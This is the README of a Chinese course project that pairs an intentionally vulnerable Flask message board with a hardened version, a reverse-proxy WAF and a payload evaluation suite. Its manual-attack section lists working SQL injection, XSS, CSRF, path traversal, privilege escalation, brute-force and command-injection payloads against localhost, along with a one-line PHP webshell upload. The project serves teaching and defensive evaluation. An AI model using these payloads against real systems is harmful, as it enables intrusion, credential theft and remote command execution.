# allweb-defense

Web 应用通用漏洞分析与防御课程设计项目。实现了一个留言板系统的漏洞版与防护版，并附带独立的反向代理 WAF，演示 10 类常见 Web 攻击及其防御方案。

## 项目结构

```
allweb-defense/
├── app/
│   ├── vulnerable/     # 漏洞版 Flask 应用（端口 5000）
│   └── protected/      # 防护版 Flask 应用（端口 5001）
├── shared/
│   └── templates/      # 两个应用共用的 HTML 模板
├── waf/                # 独立反向代理 WAF（端口 8080）
│   ├── proxy.py        # aiohttp 异步代理主入口
│   ├── detector.py     # 纯函数检测/净化库
│   ├── config.py       # 配置加载（YAML + CLI）
│   └── config.yaml     # 默认配置
├── attacks/            # 攻击演示脚本
├── tests/              # 自动化测试
├── init_db.py          # 数据库初始化
└── requirements.txt
```

## 快速开始

### 安装依赖

```bash
pip install -r requirements.txt
```

### 初始化数据库

```bash
python init_db.py
```

### 启动应用

**漏洞版**（用于演示攻击）：

```bash
python app/vulnerable/app.py
# 访问 http://127.0.0.1:5000
```

**防护版**（Flask 内嵌通防中间件）：

```bash
python app/protected/app.py
# 访问 http://127.0.0.1:5001
```

**WAF 反向代理**（代理式通防，保护漏洞版后端）：

```bash
# 先启动漏洞版后端
python app/vulnerable/app.py

# 再启动 WAF 代理
python -m waf
# 访问 http://127.0.0.1:8080（流量经 WAF 过滤后转发到 5000）
```

WAF 支持命令行参数覆盖配置：

```bash
python -m waf --listen 8080 --backend http://127.0.0.1:5000
```

## 防御能力对比

| 防御方式 | 实现位置 | 适用场景 |
|---------|---------|---------|
| 绑定式通防 | `app/protected/middleware.py` | 与 Flask 应用耦合，仅保护 Python/Flask 后端 |
| 代理式通防 | `waf/` | 独立进程，语言无关，可保护任意 HTTP 后端 |

## WAF 检测规则

| 规则 | 触发条件 | 响应 |
|------|---------|------|
| SQL 注入 | GET/POST 参数含 SQL 关键字 | 403 |
| 路径穿越 | 参数含 `../` 或其编码变体 | 403 |
| 命令注入 | 参数含 `;` `&&` `\|` `` ` `` `$(` | 403 |
| 非法文件扩展名 | 上传文件不在 `.jpg/.jpeg/.png/.gif` 白名单 | 400 |
| 频率限制 | 同一 IP 对 `/login` POST 超过阈值次数 | 429 |
| XSS 净化 | 参数含 `<script>` `javascript:` `on*=` | HTML 实体编码后转发，不拦截 |
| 安全响应头 | 所有响应 | 注入 CSP、X-Frame-Options 等 5 个安全头 |

所有拦截和净化事件写入 `security.log`。

## WAF 配置

编辑 `waf/config.yaml`：

```yaml
listen_port: 8080
backend_url: "http://127.0.0.1:5000"
login_path: "/login"
rules:
  sql_injection: true
  xss: true
  path_traversal: true
  cmd_injection: true
  rate_limit: true
  file_upload: true
  security_headers: true
rate_limit:
  max_failures: 10   # 窗口内最大失败次数
  window: 60         # 时间窗口（秒）
  lockout: 300       # 锁定时长（秒）
log_path: "security.log"
```

禁用单项规则：

```bash
python -m waf --disable sql_injection
```

## WAF URL 规则文件

除了 `waf/config.yaml` 的全局开关，可以为不同 URL 路径单独裁剪要启用的检测项。规则写在一份独立的 YAML 文件里：

```yaml
# 支持的检测类型（大小写敏感）：SQL / XSS / PATH / CMD / UPLOAD
# 匹配语法：精确匹配（/login）+ 前缀通配符（/api/* 要求斜杠分段）+ 兜底（/*）
# 匹配策略：首个命中胜出（按文件顺序从上往下，nginx-style）
# 未命中：所有检测保持启用（受 waf/config.yaml 全局开关上限约束）
# 全局上限：waf/config.yaml 中关闭的检测，URL 规则无法重新启用，启动时会打印 warning

rules:
  - url: /search
    detect: [SQL, XSS]
  - url: /upload/*
    detect: [UPLOAD, PATH]
  - url: /api/*
    detect: [SQL]
```

启用方式（CLI 优先于 YAML，二者皆未给则不加载）：

```bash
# 命令行
python -m waf --url-rules waf/url_rules.example.yaml

# 或在 waf/config.yaml 中加一行
# url_rules_file: "waf/url_rules.example.yaml"
```

错误诊断：规则文件加载采用严格模式 —— YAML 语法错、未知 detect token（含错误大小写如 `sql`）、未知字段、`detect` 为空、URL 不以 `/` 开头、通配符不在末尾、URL 重复，都会在启动时报错并退出，错误信息带条目索引。`RATE`（频率限制）和 `security_headers`（安全响应头）不在 URL 规则词汇中，仍按全局开关。

完整示例见 `waf/url_rules.example.yaml`。

## 攻击演示脚本

脚本默认打漏洞版（端口 5000），可改端口验证防护效果。

| 脚本 | 演示攻击 |
|------|---------|
| `attacks/sql_injection.py` | 登录绕过、UNION 数据泄露 |
| `attacks/xss_demo.py` | 存储型 / 反射型 XSS |
| `attacks/csrf_demo.html` | 跨站请求伪造（在浏览器中打开） |
| `attacks/path_traversal.py` | 路径穿越读取任意文件 |
| `attacks/cmd_injection.py` | 命令注入执行系统命令 |
| `attacks/privilege_escalation.py` | 水平 / 垂直越权 |
| `attacks/brute_force.py` | 暴力破解登录（对比频率限制效果） |

## 运行测试

```bash
python -m pytest tests/test_detector.py -v
```

## 技术栈

- Python 3.12
- Flask 3.1.2（漏洞版 / 防护版应用）
- aiohttp 3.9.5（WAF 反向代理）
- PyYAML 6.0.2（WAF 配置）
- pytest 8.4.2（单元测试）

## 手动攻击方法

以下所有攻击均针对**漏洞版**（`http://127.0.0.1:5000`）。启动前先运行 `python init_db.py` 初始化数据库。

测试账号：
- `admin` / `admin123`（管理员）
- `alice` / `alice123`（普通用户）
- `bob` / `bob123`（普通用户）

---

### 1. SQL 注入

#### 1a. 登录绕过

**前置条件**：漏洞版运行中，无需已有账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/login
2. 用户名填入：`' OR '1'='1' --`
3. 密码随意填写（如 `x`）
4. 点击登录

**curl**：
```bash
curl -c cookies.txt -d "username=' OR '1'='1' --&password=x" \
  http://127.0.0.1:5000/login -L -v 2>&1 | grep -E "Location|302|200"
```

**预期结果**：绕过密码验证，以数据库第一个用户身份登录成功，跳转到留言板。

---

#### 1b. UNION 数据泄露

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问搜索页，在搜索框输入：
   ```
   %' UNION SELECT id,username,password,filepath,created_at,user_id FROM users --
   ```
2. 点击 SEARCH

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/search?q=%25%27+UNION+SELECT+id%2Cusername%2Cpassword%2Cfilepath%2Ccreated_at%2Cuser_id+FROM+users+--"
```

**预期结果**：页面返回 users 表中所有用户的用户名和 MD5 密码哈希。

---

### 2. 存储型 XSS

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/messages
2. 在留言框输入：
   ```html
   <script>alert('XSS: ' + document.cookie)</script>
   ```
3. 点击 PUBLISH
4. 页面刷新后弹出 alert

**curl**（提交 payload）：
```bash
curl -b cookies.txt \
  -d "content=<script>alert('XSS: '+document.cookie)</script>" \
  http://127.0.0.1:5000/messages -L
```

**预期结果**：留言保存后，每次访问留言板都会弹出包含 cookie 的 alert 弹窗（持久化）。

---

### 3. 反射型 XSS

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 直接访问以下 URL（或在搜索框输入 payload 后提交）：
   ```
   http://127.0.0.1:5000/search?q=<script>alert('reflected XSS')</script>
   ```

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/search?q=<script>alert('reflected+XSS')</script>"
```

**预期结果**：页面直接将 `<script>` 标签渲染到 HTML，浏览器执行并弹出 alert。

---

### 4. CSRF（跨站请求伪造）

**前置条件**：alice 已在浏览器中登录漏洞版

**步骤**：
1. 用文本编辑器打开 `attacks/csrf_demo.html`，确认 `action` 指向 `http://127.0.0.1:5000/settings`
2. 在**同一浏览器**中打开该 HTML 文件（`file://` 协议）
3. 页面自动提交表单，将 alice 的密码改为 `hacked`

**curl 等价**（模拟跨站请求，无 CSRF token）：
```bash
curl -b cookies.txt \
  -d "new_password=hacked&confirm_password=hacked" \
  http://127.0.0.1:5000/settings -L
```

**预期结果**：alice 密码被修改为 `hacked`，原密码 `alice123` 失效。

---

### 5. 路径穿越

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问：
   ```
   http://127.0.0.1:5000/download?filename=../app.db
   ```

**curl**：
```bash
curl -b cookies.txt \
  "http://127.0.0.1:5000/download?filename=../app.db" -o stolen.db
# 验证：
python -c "import sqlite3; db=sqlite3.connect('stolen.db'); print(db.execute('SELECT username,password FROM users').fetchall())"
```

**预期结果**：成功下载 `app.db` 数据库文件，包含所有用户密码哈希。

---

### 6. 水平越权（删除他人留言）

> **注意**：此漏洞在当前版本中已被重构为垂直越权演示（见第 7 条）。水平越权的核心是"普通用户删除他人留言"，可通过垂直越权步骤同时演示。

**前置条件**：alice 已登录，bob 有留言存在

**curl**：
```bash
# 以 alice 登录
curl -c cookies_alice.txt -d "username=alice&password=alice123" \
  http://127.0.0.1:5000/login -L

# 查询 bob 的留言 ID（从页面源码或数据库获取）
python -c "import sqlite3; db=sqlite3.connect('app.db'); db.row_factory=sqlite3.Row; [print(r['id'], r['username']) for r in db.execute('SELECT id,username FROM messages')]"

# alice 删除 bob 的留言（假设 bob 的留言 ID 为 2）
curl -b cookies_alice.txt -d "msg_id=2" \
  http://127.0.0.1:5000/messages/delete -L
```

**预期结果**：alice 成功删除 bob 的留言，无任何权限报错。

---

### 7. 垂直越权

#### 7a. 普通用户删除留言（绕过 admin-only 限制）

**前置条件**：alice 已登录，页面上无 DELETE 按钮

**curl**：
```bash
# 以 alice 登录
curl -c cookies_alice.txt -d "username=alice&password=alice123" \
  http://127.0.0.1:5000/login -L

# 直接 POST 删除接口（绕过 UI 限制）
curl -b cookies_alice.txt -d "msg_id=1" \
  http://127.0.0.1:5000/messages/delete -L
```

**预期结果**：后端无角色校验，删除成功（HTTP 302 跳转回留言板）。

---

#### 7b. 普通用户访问 admin 管理页面

**前置条件**：alice 已登录

**浏览器步骤**：
1. 直接访问 http://127.0.0.1:5000/admin/users

**curl**：
```bash
curl -b cookies_alice.txt http://127.0.0.1:5000/admin/users
```

**预期结果**：返回用户管理页面，列出所有用户（无角色校验）。

---

### 8. 不安全文件上传

**前置条件**：已登录任意账号

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/upload
2. 选择一个 `.php` 或 `.py` 文件上传
3. 上传成功，无扩展名校验

**curl**：
```bash
# 创建测试 webshell 文件
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 上传
curl -b cookies.txt \
  -F "file=@shell.php;type=application/octet-stream" \
  http://127.0.0.1:5000/upload -L
```

**预期结果**：服务器接受 `.php` 文件上传，返回成功响应（无扩展名白名单校验）。

---

### 9. 命令注入

**前置条件**：以 admin 账号登录

**浏览器步骤**：
1. 访问 http://127.0.0.1:5000/admin/messages
2. 在文件名输入框中输入：
   ```
   msg_1_admin.txt; whoami > /tmp/pwned.txt
   ```
3. 点击删除

**curl**：
```bash
# 以 admin 登录
curl -c cookies_admin.txt -d "username=admin&password=admin123" \
  http://127.0.0.1:5000/login -L

# 注入命令（Windows 用 & 替代 ;）
curl -b cookies_admin.txt \
  -d "filename=msg_1_admin.txt & whoami" \
  http://127.0.0.1:5000/admin/messages/delete -L
```

**预期结果**：服务器执行 `rm messages/msg_1_admin.txt & whoami`，注入的命令被执行（可在响应或服务器日志中观察到）。

---

### 10. 暴力破解

**前置条件**：漏洞版运行中，知道目标用户名（如 `admin`）

**curl 循环**：
```bash
# 尝试常见密码列表
for pwd in password 123456 admin admin123 qwerty letmein; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    -d "username=admin&password=$pwd" \
    http://127.0.0.1:5000/login)
  echo "$pwd -> HTTP $result"
  # HTTP 302 表示登录成功
done
```

**Python 脚本方式**：
```bash
python attacks/brute_force.py
```

**预期结果**：漏洞版无频率限制，可无限尝试。当密码为 `admin123` 时返回 HTTP 302（登录成功）。防护版在超过阈值后返回 HTTP 429。

---

## WAF 旁路攻击与防御（Origin Bypass Protection）

### 攻击模型

```
正常路径:   攻击者 ──► WAF :8080 ──► 后端 :5000  （流量被检测）
旁路攻击:   攻击者 ─────────────────► 后端 :5000  （直连，绕过所有 WAF 规则）
```

只要攻击者通过任何方式发现 5000 端口暴露（DNS 历史、Shodan、证书透明度日志、子域名爆破等），整个 WAF 就形同虚设。这在业界叫 **WAF Origin Bypass / Direct-to-Origin Attack**，Cloudflare、AWS WAF、Akamai 都把它列为部署架构的头号风险。2025 年 Zafran 团队披露的 "BreakingWAF" 漏洞研究证实，约 40% 的真实部署存在此问题。

### 业界主流方案对比

| 方案 | 原理 | 优点 | 缺点 | 本项目 |
|------|------|------|------|--------|
| **A. 网络层隔离** | 后端只监听 127.0.0.1，不绑定外网 | 最彻底、零代码改动 | 单机部署可行，分布式需 VPC | ✅ 已实施 |
| **B. 防火墙 IP 白名单** | iptables / Security Group 只允许 WAF IP | 操作系统级强制 | 跨平台麻烦 | ❌ 不实施 |
| **C. 共享密钥头** | WAF 转发时加 `X-WAF-Secret`，后端校验 | 跨平台、可云部署 | 密钥泄露即失效 | 📋 Future Work |
| **D. mTLS 双向证书** | WAF 持客户端证书，后端校验 | 最强加密 | 实现复杂 | 📋 Future Work |
| **E. 请求签名（HMAC）** | WAF 用密钥签名，后端验签 | 防篡改 + 防重放 | 实现成本中等 | 📋 Future Work |

本项目采用方案 A：在 `app/vulnerable/app.py` 与 `app/protected/app.py` 中显式绑定 `127.0.0.1`，物理上消除直连旁路的可能性。C/D/E 留作论文 Future Work。

### 实验 1：旁路攻击有效性验证（基线）

**目的**：证明后端绑定到外网时，WAF 形同虚设。

```bash
# 1. 临时改后端绑定为 0.0.0.0（仅实验用）
# 编辑 app/vulnerable/app.py 末尾：
#   app.run(host="0.0.0.0", port=5000, debug=True)

# 2. 启动 WAF + 后端
python -m waf &
python -m app.vulnerable.app &

# 3. 走 WAF 路径，确认被拦截
curl -i "http://127.0.0.1:8080/search?q=' OR 1=1--"
# 预期：HTTP/1.1 403 Forbidden（WAF 拦截）

# 4. 从同网段另一台机器（或同机不同 IP）直连后端
curl -i "http://<本机IP>:5000/search?q=' OR 1=1--"
# 预期：HTTP/1.1 200 OK + SQL 错误信息（完全绕过 WAF）
```

**结论**：当后端绑定到外网可达地址时，攻击者只要发现 5000 端口，所有 WAF 规则立即失效。

### 实验 2：方案 A 防御（绑定 127.0.0.1）

**目的**：证明绑定 `127.0.0.1` 后无法直连旁路。

```bash
# 1. 恢复后端绑定为 127.0.0.1（项目默认值）
# app/vulnerable/app.py 末尾：
#   app.run(host="127.0.0.1", port=5000, debug=True)

# 2. 启动 WAF + 后端
python -m waf &
python -m app.vulnerable.app &

# 3. 从同网段另一台机器扫描
nmap -p 5000 <本机IP>
# 预期：5000/tcp closed/filtered（无法直连）

# 4. 通过 WAF 走（127.0.0.1:5000 仅本机 WAF 进程可达）
curl -i "http://127.0.0.1:8080/search?q=' OR 1=1--"
# 预期：HTTP/1.1 403 Forbidden（WAF 正常拦截）
```

**结论**：方案 A 把后端从公网拉回到本机环回，物理上消除直连旁路的可能性。代价是后端必须与 WAF 同机部署；分布式场景下需配合方案 C/D/E。

### 取舍说明

本次只实施方案 A 的理由：

- 方案 A 几乎零代码改动，主要工作是写文档、做对照实验
- 方案 C/D/E 涉及密钥管理 / 证书体系 / 签名算法，与本项目主线（WAF 对抗性评估）正交
- 把 C/D/E 留到 Future Work，反而能呈现"评估了完整方案矩阵，根据范围只实施 A"的工程判断力

---

## WAF 对抗性评估框架（evaluation/）

`evaluation/` 目录提供自动化的对抗性 payload 评估能力，输出基线/加固对照报告。

### 测试集规模

| 类别 | 数量 | 覆盖技术 |
|------|------|---------|
| SQL 注入 | 31 | 大小写、注释、URL 编码、双重编码、NFKC、CHAR、十六进制、拼接、时间盲注、布尔盲注、括号、反引号、空白替换 |
| XSS | 32 | script 标签、大小写、svg/img 事件、换行、HTML 实体、javascript:、Data URI、polyglot、mXSS、Unicode |
| 路径穿越 | 20 | 基础 ../、URL 编码、双重编码、畸形 UTF-8、混合分隔符、绝对路径、null byte、四点、反斜杠、overlong UTF-8 |
| 命令注入 | 27 | 分号、管道、反引号、`$()`、`${IFS}`、`$@`、`$*`、进程替换、brace expansion、转义、引号截断、通配符、base64 |
| 文件上传 | 14 | 双扩展名、null byte、.phtml/.pht/.php5/.phar、大小写、magic bytes 伪装、Content-Type 谎报、polyglot 图片 |
| 频率限制 | 5 | X-Forwarded-For 伪造、X-Real-IP 伪造、多值 XFF、慢速 burst、无头 baseline |
| 干净集（误报） | 32 | 含 SQL 关键字的自然语言、含撇号的名字、价格、邮箱、URL 等 |
| **合计** | **161** | |

来源：HackTricks / PayloadsAllTheThings / PortSwigger Academy / OWASP

### 启动 WAF + 后端

```bash
# 终端 1：启动漏洞版后端
python -m app.vulnerable.app

# 终端 2：启动 WAF 反向代理
python -m waf
```

### 运行评估

```bash
# 完整基线评估（跳过速率限制，避免 5 分钟锁定）
python -m evaluation baseline --skip-rate-limit

# 完整加固后评估
python -m evaluation hardened --skip-rate-limit

# 仅跑误报集（每次加固后回归用）
python -m evaluation baseline --category benign

# 仅跑速率限制（需要等待 lockout 过期或重启 WAF）
python -m evaluation baseline --category rate_limit
```

### 输出位置

```
evaluation/results/
├── baseline-YYYY-MM-DD.md      # 基线评估报告（含 TPR/FPR/F1 表 + 失败 payload）
├── hardened-YYYY-MM-DD.md      # 加固后评估报告
├── comparison.md               # 对照表 + 加固总结
└── figures/
    ├── overall-baseline.png    # 基线分类柱状图
    ├── overall-hardened.png    # 加固分类柱状图
    ├── overall-comparison.png  # 对照柱状图（4 系列）
    ├── confusion-baseline.png  # 基线混淆矩阵热图
    └── confusion-hardened.png  # 加固混淆矩阵热图
```

### 关键结果

| 指标 | 基线 | 加固后 | Δ |
|------|------|--------|---|
| Overall TPR | 61.3% | 71.8% | **+10.5pp** |
| Overall FPR | 31.2% | 28.1% | **-3.1pp** |
| SQL 注入 TPR | 74.2% | 93.5% | +19.4pp |
| 路径穿越 TPR | 60.0% | 80.0% | +20.0pp |
| 命令注入 TPR | 85.2% | 92.6% | +7.4pp |
| 文件上传 TPR | 50.0% | 64.3% | +14.3pp |

加固通过 8 个独立 commit 完成（`git log --oneline | grep "feat(waf)"`），每条规则改进单独验证 FPR 增长 ≤5pp。详见 `evaluation/results/comparison.md`。

### 评估方法局限

1. **XSS 通过净化（sanitize）而非拦截（block）实现**：WAF 对 XSS payload 返回 200 + 净化后的 HTML，而 runner 只按 status code 判定。这会低估 XSS 防御能力。完整评估需要解析响应体校验 payload 是否被净化。
2. **rate_limit 类别需要重启 WAF 清除锁定状态**：默认 5 分钟锁定，runner 提供 `--skip-rate-limit` 选项。
3. **测试集为白盒选取**：payload 来自已知绕过技术库，未覆盖未公开的 0day。
